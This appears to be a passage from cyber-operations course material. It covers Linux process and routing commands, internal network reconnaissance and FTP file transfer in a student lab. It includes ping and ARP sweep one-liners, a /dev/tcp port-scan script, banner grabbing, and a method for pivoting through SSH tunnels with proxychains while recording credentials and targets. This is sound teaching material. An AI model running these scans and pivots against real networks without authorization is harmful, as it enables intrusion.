0 S student  16108 18446  0  80   0 - 88036 -      Jul06 ?        00:00:00 /usr/lib/gvfs/gvfsd-fuse /run/user/1001/gvfs -f -o
4 S root     18441   668  0  80   0 - 25361 -      Jul02 ?        00:00:00 sshd: student [priv]
4 S student  18446     1  0  80   0 - 14135 SyS_ep Jul02 ?        00:00:00 /lib/systemd/systemd --user
5 S student  18448 18446  0  80   0 - 21741 -      Jul02 ?        00:00:00 (sd-pam)
5 S student  18456 18441  0  80   0 - 25361 -      Jul02 ?        00:00:01 sshd: student@pts/0
0 S student  18457 18456  0  80   0 -  3172 -      Jul02 pts/0    00:00:00 -bash
4 S root     18492 18457  0  80   0 - 13918 -      Jul02 pts/0    00:00:00 sudo su
4 S root     18497 18492  0  80   0 - 14259 -      Jul02 pts/0    00:00:00 su
4 S root     18498 18497  0  80   0 -  3157 -      Jul02 pts/0    00:00:00 bash
1 S root     19773     2  0  80   0 -     0 -      Jul05 ?        00:00:05 [kworker/u4:1]
5 S proftpd  20188     1  0  80   0 - 31669 -      Jul04 ?        00:00:02 proftpd: (accepting connections)
1 S root     21128     2  0  60 -20 -     0 -      Jul06 ?        00:00:00 [cfg80211]
4 S root     23465   668  0  80   0 - 25361 -      13:49 ?        00:00:00 sshd: student [priv]
5 S student  23471 23465  0  80   0 - 25361 -      13:49 ?        00:00:00 sshd: student@pts/1
0 S student  23472 23471  0  80   0 -  3172 core_s 13:49 pts/1    00:00:00 -bash
1 S root     23473     2  0  80   0 -     0 -      13:49 ?        00:00:00 [kworker/u4:0]
1 S root     23697     2  0  80   0 -     0 -      14:03 ?        00:00:00 [kworker/1:0]
4 S root     24352   668  0  80   0 - 25361 -      14:43 ?        00:00:00 sshd: student [priv]
5 S student  24360 24352  0  80   0 - 25361 -      14:43 ?        00:00:00 sshd: student@pts/2
0 S student  24361 24360  0  80   0 -  3172 -      14:43 pts/2    00:00:00 -bash
1 S root     24671     2  0  80   0 -     0 -      15:00 ?        00:00:00 [kworker/0:0]
1 S root     24686     2  0  80   0 -     0 -      15:01 ?        00:00:00 [kworker/1:2]
1 S root     24762     2  0  80   0 -     0 -      15:06 ?        00:00:00 [kworker/0:1]
0 R student  24773 24361  0  80   0 -  7450 -      15:06 pts/2    00:00:00 ps -elf
Linux:
The top command is a widely used utility on Unix-like operating systems (such as Linux and macOS) that provides a real-time, dynamic view of system processes. It displays information about system performance, running processes, and resource utilization.

student@internet-host-student-01:~$ top

top - 15:08:01 up 7 days, 18:12,  3 users,  load average: 0.01, 0.06, 0.07
Tasks: 121 total,   1 running, 120 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.1 sy,  0.0 ni, 99.1 id,  0.8 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :  4050832 total,  3088400 free,   149388 used,   813044 buff/cache
KiB Swap:        0 total,        0 free,        0 used.  3560824 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
    1 root      20   0   57288   7120   5344 S   0.0  0.2   0:43.38 systemd
    2 root      20   0       0      0      0 S   0.0  0.0   0:00.17 kthreadd
    3 root      20   0       0      0      0 S   0.0  0.0   0:00.06 ksoftirqd/0
    5 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kworker/0:0H
    7 root      20   0       0      0      0 S   0.0  0.0   0:19.07 rcu_sched
    8 root      20   0       0      0      0 S   0.0  0.0   0:00.00 rcu_bh
    9 root      rt   0       0      0      0 S   0.0  0.0   0:02.24 migration/0
   10 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 lru-add-drain
   11 root      rt   0       0      0      0 S   0.0  0.0   0:01.63 watchdog/0
   12 root      20   0       0      0      0 S   0.0  0.0   0:00.00 cpuhp/0
   13 root      20   0       0      0      0 S   0.0  0.0   0:00.00 cpuhp/1
   14 root      rt   0       0      0      0 S   0.0  0.0   0:01.50 watchdog/1
   15 root      rt   0       0      0      0 S   0.0  0.0   0:01.94 migration/1
   16 root      20   0       0      0      0 S   0.0  0.0   0:00.34 ksoftirqd/1
   18 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kworker/1:0H
   19 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kdevtmpfs
   20 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 netns
   21 root      20   0       0      0      0 S   0.0  0.0   0:00.58 khungtaskd
   22 root      20   0       0      0      0 S   0.0  0.0   0:00.00 oom_reaper
   23 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 writeback
   24 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kcompactd0
   26 root      25   5       0      0      0 S   0.0  0.0   0:00.00 ksmd
   27 root      39  19       0      0      0 S   0.0  0.0   0:00.00 khugepaged
   28 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 crypto
   29 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kintegrityd
   30 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   31 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kblockd
   32 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 devfreq_wq
   33 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 watchdogd
   34 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kswapd0
   35 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 vmstat
   47 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kthrotld
   48 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 ipv6_addrconf
   84 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   85 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   86 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   87 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 ata_sff
   88 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   90 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   91 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   92 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
   93 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
  120 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
  121 root      20   0       0      0      0 S   0.0  0.0   0:00.00 scsi_eh_0
  122 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 scsi_tmf_0
  123 root      20   0       0      0      0 S   0.0  0.0   0:00.00 scsi_eh_1
  124 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 scsi_tmf_1
  126 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset
  157 root       0 -20       0      0      0 S   0.0  0.0   0:04.90 kworker/1:1H
  159 root      20   0       0      0      0 S   0.0  0.0   0:09.94 jbd2/vda1-8


Resources


Instructor Note


6.6.2.8 which or whereis¶
The which command is used on Unix-like operating systems (such as Linux and macOS) to locate the executable file associated with a given command or program. It helps you find the path of the executable that would be executed when you type a command in the shell.

which [program] returns the pathnames of the files.
The whereis command is used on Unix-like operating systems to locate the binary, source, and manual page files associated with a command or program. It provides more comprehensive results than which by searching in multiple directories and locations.

whereis [program] locates the binary, source and manual files for the specified command names.


Resources


Instructor Note


6.6.2.9 Routing Table¶
Windows: route print

Linux/Unix: netstat -r (deprecated)

Linux/Unix: ip route

While end hosts are not routers, they do perform some routing functions within their capabilities. These functions are typically constrained to the following:

Inbound Routing Functions:

Destination Check: Does the packet's destination match the host's own IP address?
Forwarding Decision: If the packet is not destined for the host itself, does the host have knowledge of and access to the target? (Note: IP forwarding must be enabled for this to occur.)
Outbound Routing Functions:

Local Network Delivery: Is the target device on the same network as the host? If so, the packet is forwarded to the target's local MAC address.
Remote Network Delivery: If the target device is on a different network, the packet is sent to the gateway's MAC address, which will handle further routing.
Windows:
The route print command is used on Windows operating systems to display the current IP routing table. This table shows how network traffic is routed through the network interfaces of the computer.

route print

===========================================================================
Interface List
 13...00 1c 42 00 3f 1c ......Intel(R) Ethernet Connection (2) I218-V
  9...00 1c 42 00 3f 1c ......Intel(R) Wireless WiFi Link 5000 Series
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
      0.0.0.0          0.0.0.0       192.168.1.1   192.168.1.100     10
    192.168.1.0    255.255.255.0       192.168.1.1   192.168.1.100     10
    192.168.1.1  255.255.255.255         On-link   192.168.1.100     10
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
If Metric Network Destination      Gateway
  1    306 ::/0                     fe80::1
  1    306 2001:db8::/32             ::1
  1    306 fe80::/64                 On-link
Linux:
The netstat -r command is used on Unix-like operating systems (such as Linux and macOS) to display the system's routing table. This table shows the routes that network packets take to reach their destination, including details about the network destinations, gateways, and interfaces.
-r (--route) - Display the kernel routing tables.

student@internet-host-student-01:~$ netstat -r
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         10.10.0.62      0.0.0.0         UG        0 0          0 eth0
10.10.0.32      0.0.0.0         255.255.255.224 U         0 0          0 eth0
Linux:
The ip route command is part of the iproute2 suite of utilities used on Linux systems for managing network interfaces, routing tables, and more. It provides detailed information about the routing table, allowing you to view, add, delete, or modify routes.

student@internet-host-student-01:~$ ip route
default via 10.10.0.62 dev eth0
10.10.0.32/27 dev eth0 proto kernel scope link src 10.10.0.40


Resources


Instructor Note


6.6.2.10 Find¶
The find command is used on Unix-like operating systems (such as Linux and macOS) to search for files and directories within a directory hierarchy based on various criteria. It is a versatile and powerful tool for locating files and performing actions on them.

    find [where to start searching from] [expression determines what to find] [-options] [what to find] 2> /dev/null

student@internet-host-student-01:~$ find / -name passwd 2> /dev/null
/usr/bin/passwd
/usr/share/doc/passwd
/usr/share/bash-completion/completions/passwd
/usr/share/lintian/overrides/passwd
/etc/pam.d/passwd
/etc/cron.daily/passwd
/etc/passwd
/ - specifies to start searching from system root.

-name *pattern* - Base of file name (the path with the leading directories removed) matches shell pattern pattern.

-iname *pattern* - Like -name, but the match is case insensitive.

*filename* - specify the name of the file to search for. Can use wildcards (*) before or after.

2>/dev/null - removes error responses such as "Permission denied"



Resources


Instructor Note


6.6.2.11 SSH Port¶
When accessing a target system via Telnet or a remote shell, you might not be immediately aware of the SSH port in use. Although tools like netstat or ss can list open and listening TCP ports, they may not reveal the specific port assigned to SSH, especially since SSH does not always default to port 22.

To accurately determine the SSH port, you should directly examine the SSH server configuration. This configuration is typically specified in the sshd_config file, which dictates the port on which SSH listens.

Linux: /etc/ssh/sshd_config.

grep ^Port /etc/ssh/sshd_config
Windows systems using OpenSSH: C:\ProgramData\ssh\sshd_config or C:\Windows\System32\OpenSSH\sshd_config



Resources


Instructor Note


6.7 Describe Methods Used for Active Internal Network Reconnaissance¶




Active Internal Reconnaissance looks very similar to Active External Reconnaissance and uses many of the same tools such as PING, NMAP and Netcat. They are employed in the same manner as Active External Recon except that the targeted addresses, ports, and services may be different.

Active internal network reconnaissance involves the proactive identification and probing of assets, systems, and vulnerabilities within an organization's internal network. This phase is a crucial element of cybersecurity assessments, penetration testing, or ethical hacking conducted within the internal network environment. In comparison to passive reconnaissance, which entails observation without direct interaction, active internal network reconnaissance utilizes a variety of tools and techniques to actively deploy probes, requests, and queries for gathering information and evaluating potential weaknesses.

In this phase we will commonly used commands on the local system to probe or interact with other systems on the internal network. With SSH Tunneling, we can leverage tools on our local system to route our traffic through the internal system, enabling us to examine or engage with internal systems.



Resources


Instructor Note


6.7.1 ARP Scan¶
As we have learned before, ARP is used to resolve IP addresses to MAC addresses. By exploiting this protocol, we can learn the IPs an MAC addresses of devices in the local network segment. The responses that return are only for the local segment, so the requests must be run internally from the desired location. This is a low level scan that can potentially be overlooked on many networks.

ARP Scanning

sudo arp-scan --interface=eth0 --localnet

sudo arp-scan --interface=eth0 10.1.0.0/24

arping –c 1 –i eth0 172.16.32.2 (can only scan a single host, results vary)

for ip in $(sew 1 254) ; do if ping -c 1 10.1.0.$ip>/dev/null; then echo "10.1.0.$ip UP"; fi ;done

nmap –PR 172.16.32.2(legitimate scan that often does not show results)

nmap -PR -6 fe80::f816:3eff:fed9:5116/64(takes a long time to run)


Resources


Instructor Note


6.7.2 PING Scan¶
A PING scan, also known as an ICMP Echo scan or simply a Ping scan, is a type of network reconnaissance technique used to determine the reachability of hosts on a network. It works by sending ICMP Echo Request packets (PING) to a range of IP addresses and listening for ICMP Echo Reply packets (PONG) that are returned by live hosts.


ping -c 1 172.16.82.106

for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

sudo nmap -sP 172.16.82.96/27


Resources


Instructor Note


6.7.3 /DEV/TCP¶
/dev/tcp is a special virtual filesystem in Linux that provides access to TCP sockets as if they were files. It allows you to create client or server connections to remote hosts using Bash shell commands or scripts, without the need for external utilities or libraries.

Performing TCP scanning using /dev/tcp in Bash is not directly supported because /dev/tcp is primarily used for creating client connections to remote hosts, not for scanning multiple hosts and ports. However, you can create a script in Bash to perform TCP scanning using /dev/tcp for a single host and port.

One of the advantages about /dev/tcp is that it can be used without root level privileges. This can allow the ability to perform a TCP port scan on a network when other tools like NMAP or Netcat are not available.

Since /dev/tcp is normally installed by default of most Linux systems with the Bash shell, this can a major vulnerability and a possible tool to use in reconnaissance.

Banner Grabbing with /dev/tcp


exec 3<>/dev/tcp/tgt_ip/tgt_port; echo -e "" >&3; cat <&3
exec 3<>/dev/tcp/tgt_ip/tgt_port: Opens a file descriptor (FD) 3 for reading and writing to the specified hostname and port using /dev/tcp.
echo -e "": Sends data to the port to interogate it.
cat <&3: Reads the response from the server on file descriptor 3 and displays it on the console.
Port-scanning using /dev/tcp:

One-liner:

for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done
Script:

#!/bin/bash
echo "Enter the IP address you want to do a full port scan on."
read address
rm $address.txt
for p in {1..65535};
do
    timeout 1 bash -c "echo >/dev/tcp/$address/$p" >/dev/null 2>&1  &&
    echo "$p open" >> $address.txt ||
    echo "$p is closed"
done
cat $address.txt
This script prompts the user to provide a single IP address to run a full port scan on.

It removes any previous output files ran by the script with the same IP address.
It iterates through all avalable ports and then reports all reachable ports as "is open" and all closed ports as "is closed".
It saves the open ports results to a file and cats the contents of that file after the script completes.


Resources


Instructor Note


6.8 Perform Network Forensics¶


Resources


Instructor Note


6.8.1 Map a Network¶
Map a network through correlation of relevant network artifacts gathered through Reconnaissance and analysis

Mapping a network refers to the process of discovering and documenting the devices, resources, and topology of a computer network. This includes identifying all devices connected to the network, such as computers, servers, routers, switches, printers, and other networked devices, as well as understanding the relationships between these devices and how they communicate with each other.

Networks can be very small (1 or 2 systems) to very large (1000+). Visualizing the network can be very challenging.
Creating a physical map of the network is very valuable to Network Defenders for troubleshooting but this information can be a huge vulnerability if this information falls into the wrong hands.
Understanding how to create a Network map is invaluable.
The concepts below will be crucial for the rest of the course activities and exercises.
Different units and missions may require accompanying documents to your network map(s) and network map standards may vary between units in addition to whether you are offensive or defensive.
Offensive Mapping:

Diagram devices - Use specific images/drawings for different devices. Depending on the data available it may not be possible to see all devices on the network for a variety of reasons such as the layer that a device functions at, or where a device is located in a network.
Routers - Image to depict different vendors/models.
Switches - This type of device is often not seen offensively due to the layers that they function at.
Hosts - Image to depict desktop/laptop or operating system.
Servers - Should be classified separatly from hosts. Knowing where and what servers are can provide additional context and information for future planning.
Firewalls - These provide more powerful filtering compared to router ACL's.
Clouds - This pertains to both cloud services utilized and elements outside of the target network.


Types of lines:
Solid - Direct connection between devices
Dashed - Devices are able to talk but it has not been confirmed that they are directly connected i.e. there is a chance of a device between them.


Additional Written Information - This is information that should accompany devices and additional groupings
Device names - Naming schema allows you to confirm what machine you are on and often tells you how many devices/ what unidentified devices may be called.
IP address and MAC address - needed to directly address specific device.
Number and types of interfaces - Systems with more than one interface means that it can potentially be connected to several networks. This system can be a potential pivot system.
Operating system - Identify the OS, version and patches applied. This will potentially lead to possible vulnerabilities and exploits.
Versions/patches - This will help identify security features, functions, and vulnerabilities available.
Credentials - usernames and passwords to access the system.
Ports/Services - all open service ports on system.
Protocols running - Other than TCP/UDP it may be useful to know if ICMP is allowed/running. Identify any other protocols discovered.
Device Coloring:
Red - Non viable target
Yellow - Possible target; non verified credentials or possible exploitable vulnerability
Green - Valid target with verified credentials or exploitable vulnerability


Additional Groupings:
Routing Protocols
VLANS
NAT boundaries
Tunnels
Job Role




Resources


Instructor Note


6.9 Network Recon Methodology¶
What we need to do:

Gather initial information ( inital access ip address and port(s) )
Determine the network range ( /16, /20, /24, /27 )
Identify active machines ( ping or port scan )
Discover open ports and access points ( port scan)
Fingerprint the operating system ( banner grab ports or sniff traffic )
Uncover services on ports ( banner grab open ports )
Map the network ( physically draw network starting from your system and build a tree view )


How we go about doing it:



1. Conduct Passive recon on your (or remote) system (if needed)
ip addr (ipconfig/ifconfig) – this will show all interfaces and IP address as well as MAC, CIDR, and Broadcast
Use reverse subnetting to determine the network range (first - last IP) from the IP/CIDR.
10.10.0.40/27
Network = 10.10.0.32
Usable range = 10.10.0.33 - 10.10.0.62
Broadcast = 10.10.0.63
ip neighbor (arp -a) – will display any systems that the local system has communicated with recently.
May show some systems, but any systems it has not communicated with will not be in the database.
ss (netstat) – display any TCP/UDP listening ports.
Use to see all TCP/UDP ports listening on 0.0.0.0.
May see ports that you did not see from active scanning.
ps -ef – identify any services/daemons running on the system.
Look for specific services like running processes, firewall, or IDS/IPS software.
find – use to search for specific files/folders.
find / -name *name* 2> /dev/null
find / -iname *name* 2> /dev/null
* are wildcards that can be used before/after a name.
Share folder (/usr/share/cctc) – any files stored on the system.
tcpdump/Wireshark – (if accessible) to sniff traffic.
Use which or whereis to identify any other programs installed on the system with their binary paths.


2. Conduct Active recon (scan) from your box to find other systems on the same network.
./scan.sh or nmap - scan from your box
proxychains ./scan.sh or proxychains nmap - scan thru dynamic tunnel to enumerate from proxy.


3. Conduct Network Forensics
Identify IP address, TCP/UDP ports you find and document them on your network map.
Create a tree view map with your system being the root and each system accessible from your box as branches.
Enumerate TCP and UDP ports to identify services running on them.
Interact with services you see (FTP, curl, wget, firefox, NC, etc.).
FTP (21) or HTTP(s) (80/443) you can use:
curl http://10.0.0.1 or curl ftp://10.0.0.1
wget -r http://10.0.0.1 or wget -r http://10.0.0.1:2000 or wget -r ftp://10.0.0.1
SSH (port 22)
Telnet (23)
Banner grab other ports:
nc 10.0.0.1 1111
telnet 10.0.0.1 2222
Pull files using scp:
scp student@10.0.0.1:/usr/share/cctc/flag.png .


4. Review collected data from the systems (review file information and clues)
systematically download all data to your system to analyze and record.
Identify any possible pivot system(s) you can use to find more systems. (needs SSH or Telnet access)
does any system have either ssh or telnet open to pivot thru?


5. Conduct Active Enumeration
Remote to pivot (if applicable).
Conduct passive recon on the pivot box (same as step 1). Is it a viable pivot?
(Back on your box) Build a tunnel to pivot (with -D, -L, or -R if needed).
Build Dynamic Tunnel to pivot:
ssh user@ip-address -D 9050
Build a Local or Remote tunnel:
Your-box$ ssh user@ip-address -L 1111:next-pivot-ip:22
Remote-box$ ssh user@ip-address -R 1111:localhost:22


6. Conduct Active recon (scan through Proxychains) from your box to find other systems accessible from your new pivot.
proxychains ./scan.sh - scan thru dynamic tunnel to enumerate from proxy.


7. Conduct Network Forensics
Identify IP address, TCP/UDP ports you find and document them on your network map.
Create the additional tree "branches" on your map.
Enumerate TCP and UDP ports to identify services running on them.
Interact with services you see using proxychains (FTP, curl, wget, NC, ssh, telnet, etc.):
FTP (21) or HTTP(s) (80/443) you can use:
proxychains curl http://10.0.0.1 or proxychains curl ftp://10.0.0.1
proxychains wget -r http://10.0.0.1 or wget -r http://10.0.0.1:2000 or proxychains wget -r ftp://10.0.0.1
proxychains ssh (port 22)
proxychains telnet (23)
Banner grab other ports:
proxychains nc 10.0.0.1 1111
proxychains telnet 10.0.0.1 2222
Pull files using scp:
proxychains scp student@10.0.0.1:/usr/share/cctc/flag.png .


Repeat from step 4.


Additional guidance:
Windows (terminal) management. You will have many tunnels open so you need to keep it organized. Rename windows to help organize.
File management. You will pull many artifacts back to your system. We need to organize them so you know where each file was pulled from and relates to. (wget -r can help with this). You can also use pcmanfm command thru a -X ssh session to open the system file manager to navigate the file system with a GUI.
Create a physical map of the network and markdown information you find (as you find them).
Take Op-notes on what you are doing, the systems you interfaced with, the information you collected, tunnels you created, things you tried, and things that may have failed.

File Transfer and Redirection¶
Lesson Number: 112-CCTC17

Slides¶
File Transfer and Redirection Slides
7.0 Outcome¶
Describe standard methods of transferring files
Conduct file transfers with FTP
Compare Active vs Passive FTP
Conduct file transfers with SCP
Conduct file transfers through an SSH Tunnel
Conduct uncommon methods of file transfers
Conduct file transfers with netcat
Conduct file transfers with netcat relays
Conduct file transfers with /dev/tcp
Understand packing and encoding
Perform HEX encoding and decoding
Perform BASE64 encoding and decoding
Conduct file transfers with BASE64
Understanding both standard and uncommon file transfer methods is essential for cybersecurity professionals and network administrators, as these methods vary in security, efficiency, and use cases.

Standard methods like FTP (File Transfer Protocol) are widely used but transmit data in plaintext, making them vulnerable to interception. FTP operates in two modes: Active FTP (where the client opens a port and the server connects back) and Passive FTP (where the client connects to a port on the server), with Passive FTP being more firewall-friendly. A more secure alternative is SCP (Secure Copy Protocol), which uses SSH (Secure Shell) to encrypt data, ensuring confidentiality and integrity. SSH tunnels can also provide secure file transfers by encapsulating data in an encrypted channel.

Uncommon methods like Netcat offer flexibility by setting up a simple connection between two systems for file transfer, while Netcat relays can forward data between systems. Another method, /dev/tcp in Unix-like systems, allows low-level communication over TCP/IP for file transfers. Additionally, techniques like HEX and BASE64 encoding are used to represent binary data in ASCII format, making it easier to transmit over text-based protocols, such as email or web applications.

These methods, both standard and uncommon, play vital roles in managing data flow securely and efficiently. Cybersecurity professionals need to understand when and how to use each method to ensure both functionality and security.



Resources


Instructor Note


7.1 Conduct Common Methods of File Transfer¶
As a defender or an attacker it is extremely important to understand multiple methods of data transfer. File transfer is the focus of the discussion for this portion of the section.



Resources


Instructor Note


7.1.1 TFTP¶
Trivial File Transfer Protocol is a simple protocol for file transfer. It's extremely small, unsecure, and very simple communication. Developed in the 1970s and commonly used to transfer files between network devices; especially those that lack sufficient memory or disk space. This protocol is still used today in some consumer and commercial routers.

published in RFC 1350 Rev2
uses UDP port 69
Unsecure - no authentication or encryption
no terminal communication or directory services
useful for booting disk-less nodes in LAN's supporting technologies such as BOOTP for example. (BOOTP assigns the client IP address and tells where to find the TFP server, TFTP serves up the boot image to the client)


Resources


Instructor Note


7.1.2 FTP¶
File Transfer Protocol is a standard network protocol that is used for file transfer using the client-server architecture model.

originally published in RFC 114 in 1971, it was last revised in 1985 with the publication of RFC 959
uses TCP port 21 for control and port 20 for data connections
unsecure - passes authentication (username and password) and all communication in clear text
can be configured for Anonymous login
has directory services and terminal communication
FTP has two modes of operation:
Active
Passive
User Command	System Command	Action
ls	LIST	Lists the contents of the current directory on the remote FTP server.
pwd	PWD	Prints the current working directory on the remote FTP server.
cd	CWD	Changes the current working directory on the remote FTP server.
get	RETR	Retrieves a file from the remote FTP server and stores it locally.
put	STOR	Stores a file on the remote FTP server.
passive	PASV	Switches the FTP server into passive mode for data transfer.
quit/exit	QUIT	Terminate FTP sessions and exit.
delete	DELE	Deletes a file on the remote FTP server.
mkdir	MKD	Creates a new directory on the remote FTP server.


Resources


Instructor Note


7.1.2.1 Active¶
In active FTP, the FTP client initiates the control but the server initiates the data connections. After establishing the control connection (typically on port 21), the client sends a PORT command over the control connection to the server, specifying which port it will listen on for incoming data connections. The server then initiates a data connection to the client's specified port to transfer files.

A client initiates a connection with a server on port 21 from the client's ephemeral high port. The three way handshake is completed and the client listens on its ephemeral high port + 1, the client sends the port N+1 command to the server on port 21 (control port). Ex: if the command to the server is from ephemeral port 1026, it would listen on port 1027. Once that is done, the server initiates a connection to the client's ephemeral high (1027) from the server's data port (20) and the data is transferred.

Its important to note that for Active FTP to work, both client and server must be able to connect to each other. Any firewalls or NAT can interfear will communication.

ftp active pcap
Example 1: Active FTP.



Active FTP Diagram Walkthrough

The client's command port contacts the server's command port and sends a command for the client's ephemeral high port + 1
The FTP server responds to the client with an ACK to the client's command port
The FTP server initiates initiates a connection from its data port 21 to the client's specified data port (ephemeral high + 1)
The FTP client sends an ACK back to the server's data port 20 from the client's ephemeral high data port. This also leads to issues when using ftp through an SSH tunnel which will be discussed later.
Problem posed by Active FTP:

Active FTP can encounter issues with firewalls and NAT (Network Address Translation) devices because the server initiates the data connection back to the client. Firewalls may block incoming connections, causing problems with data transfer.

In active FTP, the client must have a range of ports available for incoming data connections. The client's firewall must also allow traffic on these ports.

Using ftp to connect to a remote host

From bob-host we use ftp 10.0.0.104 to connect to james-host by it's ip 10.0.0.104.
We authenticate with either anonymous, james, or any other account on the system.
Using anonymous we will be able to see the contents of the ftp-root folder.
Using james we will be able to see any files in james's home drive.

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list

{any files that are in James's home drive}

226 Transfer complete
ftp>


Resources


Instructor Note


7.1.2.2 Passive¶
In passive FTP, the client initiates both control and data connections. After establishing the control connection, the client sends a passive (PASV) command to the server. The server responds with an IP address and port number, which the client then uses to establish a data connection to the server for file transfer.

Passive FTP sidesteps the issue of Active mode by reversing the conversation. The client initiates both the command and data connections. As long as the client can reach the server communication can occur

Example 2: Passive FTP.



Passive FTP Diagram Walkthrough

The client's command port (1029) contacts the server's command port (20) and sends the PASV command.
The FTP server responds to the client with an ACK to the client's ephemeral high command port (1029) letting the client know the server's listening data port (2020).
The FTP client initiates the data connection from its ephemeral high port (1030) to the FTP server's listening data port (2020)
The FTP server sends an ACK back to the client's ephemeral high data port (1030)
Security Concerns with Passive FTP:

While Passive mode resolves issues with the use of stateful firewalls on the client side, you are also making your server side more vulnerable to attacks. This results from the need to have a block of random high ports open on both the server and firewall to support multiple FTP connections.

Keep in mind that without the added security of SSL, both Active and Passive FTP are insecure.

Using wget to pull files from a remote host.

From blue-internet-host we connect to bob-host to create a Dynamic tunnel so we can use the proxychains tool.
From blue-internet-host we use proxychains wget -r ftp://10.0.0.104 to connect to james-host at 10.0.0.104 via our proxy bob-host.
Here you can see the wget automatically uses anonymous to log in.
You will also see that wget automatically switches to passive mode.
If using the -r recursive download option, then all files will be downloaded and placed into a folder.
Since we ran this from the blue-internet-host, the files will be downloaded to the blue-internet-host.

student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
--2024-05-03 15:09:01--  ftp://10.0.0.104/
           => 10.0.0.104/.listing
Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
done.    ==> LIST ... done.

10.0.0.104/.listing     [ <=>                ]     315  --.-KB/s    in 0s

2024-05-03 15:09:01 (88.6 MB/s) - 10.0.0.104/.listing saved [315]

Removed 10.0.0.104/.listing.
--2024-05-03 15:09:01--  ftp://10.0.0.104/flag.png
           => 10.0.0.104/flag.png
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:37289-<><>-OK
done.    ==> RETR flag.png ... done.
Length: 8323 (8.1K)

10.0.0.104/flag.png 100%[===================>]   8.13K  --.-KB/s    in 0s

2024-05-03 15:09:01 (23.4 MB/s) - 10.0.0.104/flag.png saved [8323]

--2024-05-03 15:09:01--  ftp://10.0.0.104/hint.txt
           => 10.0.0.104/hint.txt
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:39041-<><>-OK
done.    ==> RETR hint.txt ... done.
Length: 74

10.0.0.104/hint.txt 100%[===================>]      74  --.-KB/s    in 0s

2024-05-03 15:09:01 (32.8 MB/s) - 10.0.0.104/hint.txt saved [74]

--2024-05-03 15:09:01--  ftp://10.0.0.104/welcome.msg
           => 10.0.0.104/welcome.msg
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:35589-<><>-OK
done.    ==> RETR welcome.msg ... done.
Length: 170

10.0.0.104/welcome. 100%[===================>]     170  --.-KB/s    in 0s

2024-05-03 15:09:01 (79.1 MB/s) - 10.0.0.104/welcome.msg saved [170]

FINISHED --2024-05-03 15:09:01--
Total wall clock time: 0.03s
Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)
student@blue-internet-host-student-25:~$
Using ftp to pull files from a remote host.

